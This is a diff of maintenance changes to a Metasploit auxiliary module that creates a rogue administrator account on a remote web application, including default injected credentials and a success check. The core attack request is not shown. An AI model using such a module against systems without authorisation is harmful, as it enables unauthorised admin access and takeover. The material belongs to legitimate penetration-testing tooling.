@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -39,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
         OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),
         OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
-      ], self.class)
+      ])
   end
 
 
@@ -65,10 +62,10 @@ class Metasploit3 < Msf::Auxiliary
 
     # Yes, "sucess" is really mispelt, as is "Servelet" ... !
     unless res && res.code == 200 && res.body && res.body.to_s =~ /sucess/
-      print_error("#{peer} - Administrator account creation failed")
+      print_error("Administrator account creation failed")
     end
 
-    print_good("#{peer} - Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+    print_good("Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
     service_data = {
       address: rhost,
       port: rport,
